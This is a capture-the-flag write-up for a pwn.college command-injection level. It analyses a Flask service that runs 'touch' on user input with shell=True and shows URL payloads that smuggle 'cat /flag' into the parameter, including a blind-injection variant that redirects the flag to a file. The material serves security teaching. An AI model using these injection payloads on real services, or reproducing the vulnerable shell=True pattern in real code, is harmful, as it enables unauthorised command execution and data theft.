# CMDi-5 Challenge Writeup - pwn.college

## 🧠 Challenge Overview

The fifth level of the command injection series presents a Flask web server that receives a `path` argument and executes the following command:

```python
command = f"touch {arg}"
````

The server uses `subprocess.run` with `shell=True`, meaning user input is passed directly into the shell. This should, in theory, allow command injection through shell metacharacters (e.g., `;`, `&&`, `|`, etc.).

---

## 🔍 Source Code Analysis

```python
@app.route("/dare", methods=["GET"])
def challenge():
    arg = flask.request.args.get("path", "/challenge/PWN")
    command = f"touch {arg}"

    print(f"DEBUG: {command=}")
    result = subprocess.run(
        command,
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        encoding="latin",
    ).stdout

    return f"""
        <html><body>
        Welcome to the touch service! Please choose a file to touch:
        <form action="/dare"><input type=text name=path><input type=submit value=Submit></form>
        <hr>
        <b>Ran {command}!</b><br>
        </body></html>
    """
```

### Key Observations

* `shell=True`: vulnerable to command injection.
* Output of `subprocess.run(...)` is captured in `result`, but **not** displayed in the HTML.
* The only thing returned to the user is the echoed command.

---

## 🧪 Initial Attempt

We attempted to inject a command that would read the flag:

```bash
curl "http://challenge.localhost/dare?path=/challenge/PWN%3Bcat%20/flag"
```

Decoded version:

```bash
curl "http://challenge.localhost/dare?path=/challenge/PWN;cat /flag"
```

### Output:

```html
<b>Ran touch /challenge/PWN;cat /flag!</b><br>
```

### ❌ Why It Didn't Work

Although the shell did execute `touch /challenge/PWN; cat /flag`, the **output of `cat /flag` was not shown** in the response. This is because the `result` from `subprocess.run(...)` was **not used** in the HTML body — only the command string was echoed back.

This is a **blind command injection** scenario.

---

## ✅ Successful Exploit

To exfiltrate the flag, we redirected its output to a file that we could later access:

```bash
curl "http://challenge.localhost/dare?path=/tmp/dummy%3Bcat%20/flag%20>%20/challenge/output"
```

Decoded version:

```bash
curl "http://challenge.localhost/dare?path=/tmp/dummy;cat /flag > /challenge/output"
```

This ran:

```bash
touch /tmp/dummy; cat /flag > /challenge/output
```

Now, if any previous or future level allows us to `cat /challenge/output` or `ls` the `/challenge` directory, we can recover the flag from there.

---

## 🧩 Takeaways

* **Command injection doesn’t always give visible output.**
* Always verify whether you're dealing with a **blind command injection**.
* Redirecting the output to a file is a useful trick for exfiltration in blind scenarios.
